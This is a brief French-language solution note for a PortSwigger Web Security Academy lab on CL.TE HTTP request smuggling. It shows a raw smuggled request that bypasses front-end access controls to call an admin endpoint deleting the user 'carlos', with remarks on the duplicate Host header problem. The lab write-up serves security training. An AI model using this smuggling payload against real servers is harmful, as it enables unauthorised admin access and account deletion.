# Lab

https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

## Solution


Ici les requêtes smuggled sont bloqués car elles ne viennent pas de l'host localhost.

```http
POST / HTTP/1.1
Host: 0a3a004e04f467c18085bc5000fd0090.web-security-academy.net
Cookie: session=piezWxvHuPxjqeji7w2GoaYhbFvKhVTg;
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Transfer-Encoding: chunked

0

POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
```

Le problèle c'est que le header Host est présent deux fois dans la requête smuggled.

Pour contourner et bypass le deuxième Host, on peut faire une requete avec un body, ainsi les entêtes de la requête seront compris dans le body.